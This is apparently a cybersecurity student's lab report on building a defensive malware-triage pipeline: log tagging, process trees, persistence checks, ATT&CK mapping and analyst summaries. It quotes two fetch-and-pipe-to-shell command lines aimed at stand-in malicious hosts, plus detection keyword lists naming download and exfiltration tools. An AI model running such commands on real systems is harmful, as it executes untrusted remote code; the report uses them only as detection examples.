# Week 7 Day 4 Report: Malware Triage and Analysis

Week 7 Day 4 moved from event correlation into malware-focused DFIR analysis. The goal was no longer just to identify suspicious activity, but to examine what the malware was doing, how it executed, what persistence it attempted, which capabilities it exposed, and how an analyst could summarize that behavior into an actionable triage assessment.

This day functioned as a lightweight malware triage pipeline: detect suspicious behavior, reconstruct process execution, identify persistence, map capability categories to ATT&CK-aligned behaviors, classify the malware profile, and generate an analyst-facing summary.

## Objective

Build a practical malware triage workflow that demonstrates:

- Behavior-based malware analysis from log evidence
- Process lineage and execution tracing
- Persistence mechanism detection
- Capability classification and risk scoring
- Malware family assessment
- Analyst-oriented reporting from multiple artifacts

## Day Scope

Implemented and executed the following workflow components:

- `malware_triage.py`: Identify suspicious malware behavior categories from alert data
- `process_tree.py`: Extract process, PID, and command-line execution details
- `persistence_checker.py`: Detect persistence-related indicators in logs
- `capability_mapper.py`: Convert behavioral categories into capabilities, ATT&CK mappings, risk scores, and malware family classification
- `analyst_summary.py`: Generate a readable IR summary from prior outputs

Produced artifacts:

- `malware_profile.json`
- `process_tree.json`
- `persistence_findings.json`
- `capability_report.json`
- `analyst_summary.md`
- `week7_day4_report.md`

## Starting State

Day 4 started by carrying forward the Day 3 working set:

```bash
mkdir -p ~/soar-lab/week7/day4
cd ~/soar-lab/week7/day4
cp ~/soar-lab/week7/day3/*.json .
cp ~/soar-lab/week7/day3/*.log .
```

Created working files:

```bash
touch malware_triage.py
touch process_tree.py
touch persistence_checker.py
touch capability_mapper.py
touch malware_profile.json
touch week7_day4_report.md
```

Later, the analyst summary component was added as part of the advanced exercise:

```bash
touch analyst_summary.py
```

## 1. Malware Behavior Triage

`malware_triage.py` was the first core analysis script. Its purpose was to scan `alerts.log` and tag each suspicious line with one or more behavioral categories.

The initial categories included:

- `download_execute`
- `credential_access`
- `command_and_control`
- `persistence`

The Exercise 1 expansion added coverage for:

- `ransomware_behavior`
- `data_exfiltration`
- `privilege_escalation`

The final suspicious pattern model included indicators such as:

- `wget`, `curl`, `| sh`, `powershell`
- `password`, `credential`, `login`
- `beacon`, `c2`, `callback`
- `scheduled task`, `startup`, `cron`, `systemd`, `registry run`
- `encrypt`, `ransom`, `locked files`
- `zip`, `scp`, `exfil`, `upload`
- `sudo`, `admin`, `privilege`, `root`

Execution:

```bash
python3 malware_triage.py
cat malware_profile.json
```

Observed results from `malware_profile.json` showed the following categories across the alert stream:

- download and execute behavior
- command-and-control behavior
- credential access behavior
- privilege escalation indicators
- persistence activity
- data exfiltration behavior
- ransomware-like behavior

Representative findings included:

- `wget http://stage-c2.example.net/dropper.sh -O- | sh`
- `curl http://new-malicious.example.net/a.sh | sh`
- outbound beaconing to `beacon.badcommand.org`
- failed login activity using stolen credentials
- scheduled task creation
- sudo-based privileged execution
- zip-and-scp exfiltration pattern
- encryption activity across user documents

This established a strong behavioral profile rather than a narrow IOC-only view.

## 2. Process Execution and Lineage Reconstruction

`process_tree.py` extracted process metadata from structured log lines in `alerts.log`.

The script pulled:

- process name
- PID
- command line

Regex extraction targeted JSON-style fields such as:

- `"process"`
- `"pid"`
- `"cmdline"`

Execution:

```bash
python3 process_tree.py
cat process_tree.json
```

Result:

- suspicious shell activity was extracted into a simplified execution tree
- shell-based download-and-execute behavior became easy to review
- the log evidence clearly showed chained fetch-and-run patterns using `wget`, `curl`, and shell piping

This is an important malware triage step because execution chains often reveal more than single IOCs. In this case, the process evidence pointed to loader-style behavior and confirmed that the activity was not isolated network noise.

## 3. Persistence Analysis

`persistence_checker.py` scanned alert data for known persistence indicators.

Tracked indicators included:

- `scheduled task`
- `startup`
- `cron`
- `systemd`
- `registry run`

Execution:

```bash
python3 persistence_checker.py
cat persistence_findings.json
```

The log set included a persistence test event:

```text
Persistence observed: scheduled task created for updater.exe
```

Result:

- persistence detection succeeded
- one persistence finding was identified
- the detected mechanism aligned with scheduled task abuse

This mattered because persistence changed the case from simple malware execution into longer-term host compromise risk.

## 4. Capability Mapping with ATT&CK and Risk Scoring

`capability_mapper.py` was expanded to satisfy Exercises 2, 3, and 4.

The script mapped malware behavior categories into a richer capability model containing:

- capability name
- MITRE ATT&CK technique ID
- risk score

Examples from the final capability map:

- `download_execute` -> `payload_execution`, `T1059`, risk 8
- `credential_access` -> `credential_theft`, `T1555`, risk 8
- `command_and_control` -> `remote_control`, `T1071`, risk 9
- `persistence` -> `system_persistence`, `T1053`, risk 7
- `ransomware_behavior` -> `file_encryption`, `T1486`, risk 10
- `data_exfiltration` -> `data_theft`, `T1041`, risk 9
- `privilege_escalation` -> `privilege_escalation`, `T1068`, risk 8

Execution:

```bash
python3 capability_mapper.py
cat capability_report.json
```

Final capability output showed:

- identified capabilities across seven distinct malware functions
- ATT&CK enrichment for each function
- `max_risk_score: 10`

This was appropriate because the dataset now included:

- ransomware-like encryption behavior
- data theft indicators
- privilege escalation
- persistence
- remote control features

## 5. Malware Family Classification Upgrade

The initial family classifier returned a single label, which classified the sample as `RAT`.

That result was defensible because the case included:

- remote control capability
- persistence
- payload execution

However, the overall behavior set was broader than a single family label could capture. The logic was therefore improved to support multi-family tagging.

The upgraded family classification recognized overlapping behaviors such as:

- downloader
- RAT
- infostealer
- ransomware
- exfiltration tool
- loader

After the update, the output became:

```json
"malware_family_classification": [
  "RAT",
  "downloader",
  "exfiltration_tool",
  "infostealer",
  "loader",
  "ransomware"
]
```

This was a much more realistic enterprise triage outcome. Real malware frequently spans multiple behavioral categories, especially when loader, credential theft, exfiltration, and remote-control functions overlap.

## 6. Test Behavior Injection for Expanded Analysis

To validate the extended behavior coverage, additional alert lines were appended to `alerts.log`:

```bash
cat >> alerts.log << 'EOF'
Persistence observed: scheduled task created for updater.exe
Privilege escalation attempt: sudo command executed by suspicious process
Possible data exfiltration: zip archive created and uploaded via scp
Ransomware-like behavior: encrypt operation observed across user documents
EOF
```

This created direct test signals for:

- persistence
- privilege escalation
- exfiltration
- ransomware behavior

The resulting malware profile confirmed that all new categories were detected successfully.

## 7. Analyst Summary Generation

`analyst_summary.py` was created for Exercise 5 to combine the Day 3 and Day 4 artifacts into a human-readable summary.

Inputs consumed:

- `attack_path.json`
- `capability_report.json`
- `persistence_findings.json`
- `host_ioc_map.json`

Generated fields included:

- multi-stage intrusion status
- observed attack stages
- malware family classification
- maximum risk score
- impacted hosts
- persistence finding count
- recommended analyst actions

Execution:

```bash
python3 analyst_summary.py
cat analyst_summary.md
```

This converted raw technical artifacts into a triage-ready analyst note, which is exactly how DFIR workflows bridge engineering output into operational decision-making.

## 8. Initial Analytical Gap

The first `analyst_summary.md` output showed:

- `Multi-stage intrusion detected: False`

This was a problem because credential abuse had already been introduced earlier in the workflow.

### Root Cause

The issue was not malware triage itself, but stage classification precedence in `attack_path.py`.

The log line:

```text
Failed login attempt detected for admin from 10.0.1.15 using stolen credentials
```

was being classified as `privilege_escalation` rather than `credential_access` because `admin` was checked before `credential`.

This is a realistic detection engineering error: overlapping keywords produced an incorrect stage assignment because rule ordering favored the less specific category.

## 9. Stage Classification Fix

The correction was to move credential-access logic above privilege-escalation logic inside `classify_stage()`.

Corrected precedence:

```python
if "failed login" in log or "password" in log or "credential" in log:
    return "credential_access"

if "admin" in log or "privilege" in log or "sudo" in log:
    return "privilege_escalation"
```

Re-run:

```bash
python3 attack_path.py
python3 analyst_summary.py

cat attack_path.json
cat analyst_summary.md
```

Result after the fix:

- `multi_stage_intrusion_detected: true`
- observed stages included:
  - `command_and_control`
  - `credential_access`
  - `initial_access`
  - `payload_delivery`

This resolved the logical gap and confirmed that the intrusion chain met the required multi-stage criteria.

## 10. Final Pipeline Run

The full Day 4 execution path was:

```bash
python3 malware_triage.py
python3 process_tree.py
python3 persistence_checker.py
python3 capability_mapper.py
python3 analyst_summary.py
```

After the stage-ordering fix, the Day 3 attack reconstruction logic was refreshed as well:

```bash
python3 attack_path.py
python3 analyst_summary.py
```

Final workflow status:

- Malware behavior triage: successful
- Process extraction: successful
- Persistence detection: successful
- Capability mapping: successful
- Multi-family classification: successful
- Analyst summary generation: successful
- Multi-stage intrusion validation: successful

## 11. Final Findings

The final Day 4 state showed:

- multi-stage intrusion detected: `True`
- malware family classification: multi-tagged
- maximum malware risk score: `10`
- persistence findings: `1`
- impacted host: `wkstn-01`

Key behavioral conclusions:

- the malware chain included staged payload execution
- the case exhibited remote-control behavior consistent with RAT functionality
- credential theft and privilege escalation indicators were present
- persistence was established via scheduled task behavior
- exfiltration and ransomware-like actions raised the severity significantly

## 12. Practical DFIR Outcomes

Day 4 successfully demonstrated:

- malware triage from operational logs
- process execution review and shell-chain analysis
- persistence investigation
- ATT&CK-aligned capability enrichment
- risk-based malware assessment
- realistic family classification improvement
- analyst summary generation from multiple forensic artifacts

This is representative of junior DFIR and early malware analysis workflow, where the analyst is expected to interpret behavior, not just collect indicators.

## 13. Final Artifacts

- `malware_profile.json`
- `process_tree.json`
- `persistence_findings.json`
- `capability_report.json`
- `analyst_summary.md`
- `week7_day4_report.md`

## Progress Map

Week 7: Incident Response

- [x] Day 1 - IR Planning and Evidence Preservation
- [x] Day 2 - Evidence Collection and Triage
- [x] Day 3 - Log and Timeline Correlation
- [x] Day 4 - Malware Triage and Analysis
- [ ] Day 5 - Containment and Recovery
- [ ] Day 6 - Post-Incident Automation
- [ ] Day 7 - Full Incident Simulation

## Day 4 Completion

Week 7 Day 4 is complete.

The most realistic part of this module was not just adding more malware categories, but debugging the classification precedence issue. That reflected a real-world DFIR lesson: the quality of analytical output depends heavily on detection logic order, overlap handling, and behavior interpretation.

## Next Step

Week 7 Day 5: Containment and Recovery
